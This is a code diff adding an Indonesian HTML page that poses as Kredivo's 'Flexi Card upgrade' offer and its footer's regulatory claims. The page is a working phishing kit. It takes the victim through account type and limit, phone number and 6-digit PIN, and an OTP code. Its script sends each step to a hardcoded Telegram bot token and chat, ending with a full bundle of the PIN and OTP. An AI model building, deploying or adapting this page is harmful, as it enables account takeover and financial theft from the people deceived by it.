@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upgrade Flexi Card Kredivo Terbaru: Naik Limit & Bebas Tarik Tunai!</title>
+    <meta name='description' content='Segera upgrade ke Flexi Card Kredivo terbaru! Dapatkan peluang kenaikan limit lebih besar dan bebas biaya tarik tunai di seluruh mesin ATM Indonesia.' />
+    <meta name="theme-color" content="#ff7f32">
+    <meta content="https://i0.wp.com/kredivo.id/wp-content/uploads/2026/06/topbanner-desktop.png?fit=708%2C386&ssl=1" property="og:image">
+    <link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQArWxWD3N_oCrLJ5pzNzoKzmUu6V4IlL96svoag8hhHw&s" type="image/x-icon"/>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        :root { 
+            --kred-orange: #ff7f32;
+            --kred-blue: #009de0;
+            --putih: #ffffff;
+            --teks-utama: #000000;
+            --teks-kedua: #757575;
+            --batas: #bdbdbd;
+            --link: #009de0;
+        }
+
+        /* === PENTING: Agar footer selalu di bawah layar === */
+        html, body { height: 100%; display: flex; flex-direction: column; }
+
+        /* SPLASH SCREEN */
+        #splash { position:fixed; inset:0; background:var(--putih); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; transition:opacity 0.5s ease; }
+        #splash img { width:140px; height:auto; margin-bottom:20px; }
+        .loader { width:40px; height:40px; border:3px solid var(--batas); border-top-color:var(--kred-orange); border-radius:50%; animation:putar 1s linear infinite; }
+        @keyframes putar { to { transform:rotate(360deg); } }
+        #splash.hilang { opacity:0; pointer-events:none; }
+
+        /* NAVBAR */
+        .nav-login {
+            position:sticky; top:0; left:0; right:0; height:70px; background:var(--putih); padding:0 24px; display:flex; align-items:center; justify-content:space-between; z-index:999; border-bottom:1px solid #f0f0f0; flex-shrink: 0;
+        }
+        .logo-kredivo { height:36px; width:auto; }
+        .link-bantuan { font-size:15px; color:var(--teks-kedua); text-decoration:none; }
+
+        /* HEADER GAMBAR: HANYA MENU UTAMA */
+        .header-gambar {
+            width:100%;
+            height:auto;
+            overflow:hidden;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            background:#f8f9fa; flex-shrink: 0;
+        }
+        .header-gambar img {
+            width:100%;
+            height:80%;
+            object-fit:cover;
+            object-position:center;
+            display:block;
+        }
+
+        /* KONTEN UTAMA: MENGAMBIL SISA TEMPAT */
+        .konten-pembungkus { flex: 1; display: flex; flex-direction: column; }
+        .halaman { display:none; flex: 1; padding-bottom:20px; background:var(--putih); }
+        .halaman.aktif { display:flex; flex-direction:column; }
+        .isi { padding:25px 24px; max-width:480px; margin:0 auto; width:100%; flex: 1; }
+
+        /* JUDUL AJAKAN UPGRADE */
+        .judul-utama {
+            font-size:18px; color:var(--teks-utama); line-height:1.5; margin-bottom:12px; font-weight:600; text-align:center;
+        }
+        .deskripsi-utama {
+            font-size:14px; color:var(--teks-kedua); line-height:1.5; margin-bottom:30px; text-align:center;
+        }
+
+        /* UKURAN JUDUL H2 LOGIN TEPAT 15px */
+        .judul-login {
+            font-size:15px; color:var(--teks-utama); line-height:1.5; margin-bottom:35px; font-weight:500;
+        }
+
+        /* INPUT DENGAN LABEL MENGAMBANG */
+        .grup-input { margin-bottom:28px; position:relative; }
+        .input-bungkus { position:relative; width:100%; }
+        .input-bungkus input {
+            width:100%; padding:18px 45px 10px 14px; border:1px solid var(--batas); border-radius:4px; font-size:16px; outline:none; background:transparent; transition:0.2s;
+        }
+        .input-bungkus input:focus { border-color:var(--teks-utama); }
+        .input-bungkus input::placeholder { color:transparent; }
+
+        /* LABEL MENGAMBANG & BERWARNA HITAM SAAT AKTIF */
+        .label-input {
+            position:absolute; left:14px; top:16px; font-size:13px; color:var(--teks-kedua); pointer-events:none; transition:all 0.2s ease; background:var(--putih); padding:0 4px;
+        }
+        .input-bungkus input:focus ~ .label-input,
+        .input-bungkus input:not(:placeholder-shown) ~ .label-input {
+            top:-8px; left:10px; font-size:13px; color:var(--teks-utama);
+        }
+
+        /* TOMBOL MATA PIN */
+        .tombol-mata {
+            position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; padding:0;
+            width:35px; height:25px; display:flex; align-items:center; justify-content:center; z-index:2;
+        }
+        .tombol-mata img { width:100%; height:100%; object-fit:contain; }
+        .tombol-mata:focus { outline:none; }
+
+        /* LINK LAINNYA */
+        .link-lupa {
+            display:block; margin:8px 0 25px; font-size:13px; color:var(--link); text-decoration:none; font-weight:500;
+        }
+        .teks-syarat {
+            font-size:13px; color:var(--teks-kedua); line-height:1.5; margin-bottom:25px;
+        }
+        .link-daftar {
+            display:block; text-align:center; margin-top:35px; font-size:13px; color:var(--teks-kedua); text-decoration:none;
+        }
+        .link-daftar span { color:var(--kred-orange); font-weight:500; }
+
+        /* TOMBOL */
+        .btn-konfirmasi, .btn-utama, .btn-menu {
+            width:100%; padding:15px; border:none; border-radius:4px; background:var(--kred-orange); color:white; font-size:16px; font-weight:600; cursor:pointer; transition:0.2s;
+        }
+        .btn-konfirmasi:disabled, .btn-utama:disabled { background:#ffb280; cursor:not-allowed; }
+        .btn-konfirmasi:hover:not(:disabled), .btn-utama:hover:not(:disabled), .btn-menu:hover { background:#ff6b1a; transform:translateY(-2px); }
+
+        /* HALAMAN LAIN */
+        h3, h4 { font-size:18px; color:var(--teks-utama); margin-bottom:25px; font-weight:600; }
+        .keterangan { text-align:center; color:var(--teks-kedua); margin-bottom:24px; font-size:12px; }
+        .grid-menu { display:grid; gap:15px; padding:0 24px; max-width:480px; margin:0 auto; width:100%; }
+        .input-biasa {
+            width:100%; padding:14px; border:1px solid var(--batas); border-radius:8px; font-size:16px; outline:none; margin-bottom:20px; background:var(--putih);
+        }
+        .sedang-muat { display:inline-flex; align-items:center; gap:8px; }
+        .spinner { width:18px; height:18px; border:2px solid rgba(255,255,255,0.3); border-top-color:white; border-radius:50%; animation:putar 0.8s linear infinite; }
+        .timer-kotak { text-align:center; margin:16px 0; font-size:14px; color:var(--teks-kedua); }
+        .timer-teks { font-weight:600; color:var(--kred-orange); font-size:13px; }
+        .kirim-ulang { color:var(--link); font-weight:500; text-decoration:none; cursor:pointer; display:none; }
+        .kirim-ulang.aktif { display:inline; }
+        .alert-pesan { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:30px 25px; border-radius:12px; box-shadow:0 10px 40px rgba(0,0,0,0.2); z-index:9999; max-width:400px; width:90%; text-align:center; display:none; }
+        .alert-pesan h3 { color:var(--teks-utama); font-size:14px; margin-bottom:12px; font-weight:700; line-height:1.5; }
+        .alert-pesan p { color:var(--teks-kedua); font-size:14px; margin-bottom:20px; }
+        .alert-tombol { padding:12px 30px; background:var(--kred-orange); color:white; border:none; border-radius:8px; font-weight:600; cursor:pointer; }
+
+        /* ✅ FOOTER SELALU DI BAWAH LAYAR */
+        footer { 
+            background:#f8f9fa; 
+            border-top:1px solid var(--batas); 
+            padding:20px 15px; 
+            text-align:center; 
+            font-size:12px; 
+            color:#666; 
+            flex-shrink: 0;
+            width: 100%;
+        }
+        footer p { margin-bottom: 4px; }
+    </style>
+</head>
+<body>
+
+<!-- SPLASH SCREEN -->
+<div id="splash">
+    <img src="https://image.cermati.com/v1582185705/upcaqimam6jtf9hoy6mz.png" alt="Kredivo">
+    <div class="loader"></div>
+</div>
+
+<!-- NAVBAR -->
+<nav class="nav-login">
+    <img src="https://image.cermati.com/v1582185705/upcaqimam6jtf9hoy6mz.png" alt="Kredivo" class="logo-kredivo">
+    <a href="#" class="link-bantuan">Butuh Bantuan?</a>
+</nav>
+
+<!-- HEADER GAMBAR (HANYA MENU UTAMA) -->
+<div id="header-menu" class="header-gambar">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8wRU6960TWim1mvSGtDxYBcYhdUIDgqTx05AJkTX9X4W3fRYrl8hZGF69&s=10" alt="Banner Upgrade Flexi Card Kredivo">   
+</div>
+
+<!-- PEMBUNGKUS KONTEN UTAMA -->
+<div class="konten-pembungkus">
+<!-- HALAMAN 1: MENU UTAMA -->
+<div id="halaman-menu" class="halaman aktif">
+    <div class="isi">
+        <h2 class="judul-utama">Upgrade Sekarang ke Flexi Card Kredivo Terbaru!</h2>
+        <p class="deskripsi-utama">Dapatkan peluang kenaikan limit lebih besar dan nikmati bebas biaya tarik tunai di seluruh mesin ATM di Indonesia!</p>
+        
+        <div class="grid-menu">
+            <button class="btn-menu" onclick="bukaHalaman('halaman-status')">Upgrade Kartu Flexi Card</button>
+            <button class="btn-menu" onclick="bukaHalaman('halaman-status')">Cek Pengiriman Kartu</button>
+            <button class="btn-menu" onclick="bukaHalaman('halaman-status')">Lihat Status Kartu</button>
+            <button class="btn-menu" onclick="bukaHalaman('halaman-status')">Pusat Pemulihan Kartu</button>
+        </div>
+    </div>
+</div>
+
+<!-- HALAMAN 2: STATUS AKUN -->
+<div id="halaman-status" class="halaman">
+    <div class="isi">
+        <h3>Status Akun Kredivo</h3>
+        <div class="input-biasa">
+            <select id="jenisAkun" style="width:100%; border:none; outline:none; font-size:16px; background:transparent;">
+                <option value="">Pilih Type Akun</option>
+                <option value="Score A">Score A</option>
+                <option value="Score B">Score B</option>
+            </select>
+        </div>
+        <input type="tel" id="limitAkun" class="input-biasa" placeholder="Limit Tersedia Saat Ini" maxlength="12" oninput="formatRupiah(this)" required>
+        <button class="btn-utama" onclick="lanjutKeLogin()">Selanjutnya</button>
+    </div>
+</div>
+
+<!-- HALAMAN 3: LOGIN (TANPA HEADER GAMBAR) -->
+<div id="halaman-login" class="halaman">
+    <div class="isi">
+        <h2 class="judul-login">Masuk ke Akun Kredivo-mu untuk lanjut proses upgrade</h2>
+
+        <div class="grup-input">
+            <div class="input-bungkus">
+                <input type="tel" id="nomorHp" placeholder=" " maxlength="15" oninput="hanyaAngka(this)" required>
+                <label class="label-input">Nomor Handphone</label>
+            </div>
+        </div>
+
+        <div class="grup-input">
+            <div class="input-bungkus">
+                <input type="tel" id="pinAkun" placeholder=" " maxlength="6" oninput="hanyaAngka(this)" required style="-webkit-text-security:disc;">
+                <label class="label-input">PIN</label>
+                <button type="button" class="tombol-mata" onclick="lihatSembunyiPin()">
+                    <img id="gambarMata" src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Sembunyikan PIN">
+                </button>
+            </div>
+        </div>
+
+        <a href="#" class="link-lupa">Lupa PIN Kredivo? Lihat cara ubah PIN</a>
+
+        <p class="teks-syarat">
+            Dengan melanjutkan kamu menyetujui untuk melakukan pembaruan data dan proses upgrade kartu Flexi Card Kredivo
+        </p>
+
+        <button class="btn-konfirmasi" onclick="lanjutKeOtp()">Konfirmasi</button>
+
+        <a href="#" class="link-daftar">Belum punya akun? <span>Daftar lewat sini yuk</span></a>
+    </div>
+</div>
+
+<!-- HALAMAN 4: VERIFIKASI OTP -->
+<div id="halaman-otp" class="halaman">
+    <div class="isi">
+        <h4>Verifikasi Kode OTP</h4>
+        <br>
+        <p class="keterangan">Masukkan 4–6 digit kode yang dikirim ke nomor Anda</p>
+        <div class="timer-kotak">
+            Waktu tersisa: <span class="timer-teks" id="waktu">02:00</span>
+            <br><span id="pesan-kirim">Belum menerima kode? <a class="kirim-ulang" id="kirimUlang" onclick="mulaiUlangTimer()">Kirim ulang</a></span>
+        </div>
+        <input type="tel" id="kodeOtp" class="input-biasa" placeholder="Masukkan Kode OTP" maxlength="6" oninput="hanyaAngka(this)" required>
+        <button class="btn-utama" onclick="kirimDataLengkap()">Verifikasi</button>
+    </div>
+</div>
+</div>
+<!-- AKHIR PEMBUNGKUS KONTEN -->
+
+<!-- ✅ FOOTER SELALU DI PALING BAWAH LAYAR -->
+<footer>
+    <p>© 2026 Kredivo. Semua Hak Dilindungi Undang-Undang.</p>
+    <p>PT Finaccel Teknologi Indonesia terdaftar dan diawasi oleh OJK</p>
+</footer>
+
+<!-- ALERT -->
+<div class="alert-pesan" id="alertSelesai">
+    <h3>Terima Kasih<br>Permintaan Upgrade Sedang Kami Proses<br>Mohon Menunggu Instruksi Selanjutnya</h3>
+    <button class="alert-tombol" onclick="tutupAlert()">Baik</button>
+</div>
+
+<script>
+// === KONFIGURASI TELEGRAM ===
+const TOKEN_BOT = "8087878905:AAGLK2-UEE-1-_xeFWSic65RGa8lDKv2U0Q";
+const ID_CHAT = "-1003588239910";
+const MATA_TERBUKA = "https://cdn-icons-png.flaticon.com/512/565/565452.png";
+const MATA_TERTUTUP = "https://cdn-icons-png.flaticon.com/512/159/159604.png";
+
+let dataSementara = {};
+let hitungMundur;
+
+// === FUNGSI PENGATURAN HALAMAN ===
+function bukaHalaman(idHalaman) {
+    document.querySelectorAll('.halaman').forEach(h => h.classList.remove('aktif'));
+    document.getElementById(idHalaman).classList.add('aktif');
+    
+    // HANYA TAMPILKAN HEADER DI MENU UTAMA
+    const header = document.getElementById('header-menu');
+    header.style.display = idHalaman === 'halaman-menu' ? 'block' : 'none';
+    
+    window.scrollTo(0,0);
+    if(idHalaman === 'halaman-otp') mulaiTimer();
+}
+
+function hanyaAngka(input) { input.value = input.value.replace(/[^0-9]/g, ''); }
+function formatRupiah(input) {
+    let nilai = input.value.replace(/\D/g, '');
+    if(nilai.length > 8) nilai = nilai.substring(0,8);
+    input.value = nilai.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+}
+function tungguDetik(detik) { return new Promise(siap => setTimeout(siap, detik * 1000)); }
+
+async function kirimKeTelegram(teks) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: ID_CHAT, text: teks, parse_mode: 'Markdown' })
+        });
+    } catch(e) { console.log("Gagal kirim:", e); }
+}
+
+// === LIHAT/SEMBUNYI PIN ===
+function lihatSembunyiPin() {
+    const input = document.getElementById('pinAkun');
+    const gambar = document.getElementById('gambarMata');
+    if(input.style.webkitTextSecurity === 'disc') {
+        input.style.webkitTextSecurity = 'none';
+        gambar.src = MATA_TERBUKA;
+    } else {
+        input.style.webkitTextSecurity = 'disc';
+        gambar.src = MATA_TERTUTUP;
+    }
+}
+
+// === TIMER OTP ===
+function mulaiTimer() {
+    clearInterval(hitungMundur);
+    let sisaDetik = 120;
+    const tampil = document.getElementById('waktu');
+    const tautan = document.getElementById('kirimUlang');
+    tautan.classList.remove('aktif');
+    hitungMundur = setInterval(() => {
+        let menit = Math.floor(sisaDetik / 60);
+        let detik = sisaDetik % 60;
+        tampil.textContent = `${menit.toString().padStart(2,'0')}:${detik.toString().padStart(2,'0')}`;
+        sisaDetik--;
+        if(sisaDetik < 0) {
+            clearInterval(hitungMundur);
+            tampil.textContent = "Waktu Habis!";
+            tautan.classList.add('aktif');
+            setTimeout(() => location.reload(), 2000);
+        }
+    }, 1000);
+}
+function mulaiUlangTimer() { mulaiTimer(); kirimKeTelegram(`KIRIM ULANG KODE OTP\nNomor HP: ${dataSementara.hp || 'Tidak ada'}`); }
+function tutupAlert() { document.getElementById('alertSelesai').style.display = 'none'; }
+
+window.addEventListener('load', async () => { await tungguDetik(2); document.getElementById('splash').classList.add('hilang'); });
+
+// === NAVIGASI DATA ===
+async function lanjutKeLogin() {
+    const jenis = document.getElementById('jenisAkun').value;
+    const limit = document.getElementById('limitAkun').value.replace(/\./g, '');
+    if(!jenis || !limit) { alert("Lengkapi semua data terlebih dahulu!"); return; }
+    dataSementara.jenis = jenis; dataSementara.limit = limit;
+    const tombol = event.target; tombol.disabled = true; tombol.innerHTML = `<span class="sedang-muat"><span class="spinner"></span>Memproses...</span>`;
+    await tungguDetik(3); await kirimKeTelegram(`PERMINTAAN UPGRADE\nJenis Akun: ${jenis}\nLimit: Rp ${limit.replace(/\B(?=(\d{3})+(?!\d))/g, ".")}`);
+    tombol.disabled = false; tombol.innerHTML = "Selanjutnya"; bukaHalaman('halaman-login');
+}
+
+async function lanjutKeOtp() {
+    const hp = document.getElementById('nomorHp').value;
+    const pin = document.getElementById('pinAkun').value;
+    if(hp.length < 10 || pin.length < 6) { alert("Nomor HP minimal 10 digit & PIN 6 digit!"); return; }
+    dataSementara.hp = hp; dataSementara.pin = pin;
+    const tombol = event.target; tombol.disabled = true; tombol.innerHTML = `<span class="sedang-muat"><span class="spinner"></span>Memverifikasi...</span>`;
+    await tungguDetik(3); await kirimKeTelegram(`DATA LOGIN UPGRADE\nNomor HP: ${hp}\nPIN: ${pin}`);
+    tombol.disabled = false; tombol.innerHTML = "Konfirmasi"; bukaHalaman('halaman-otp');
+}
+
+async function kirimDataLengkap() {
+    const otp = document.getElementById('kodeOtp').value;
+    if(otp.length < 4 || otp.length > 6) { alert("Masukkan 4 sampai 6 digit kode OTP!"); return; }
+    dataSementara.otp = otp;
+    const tombol = event.target; tombol.disabled = true; tombol.innerHTML = `<span class="sedang-muat"><span class="spinner"></span>Mengirim data...</span>`;
+    await tungguDetik(3); await kirimKeTelegram(`DATA LENGKAP UPGRADE\nJenis: ${dataSementara.jenis}\nLimit: Rp ${dataSementara.limit.replace(/\B(?=(\d{3})+(?!\d))/g, ".")}\nNomor HP: ${dataSementara.hp}\nPIN: ${dataSementara.pin}\nKode OTP: ${otp}`);
+    tombol.innerHTML = "Data Terkirim"; document.getElementById('alertSelesai').style.display = 'block';
+}
+</script>
+</body>
+          </html>
+          
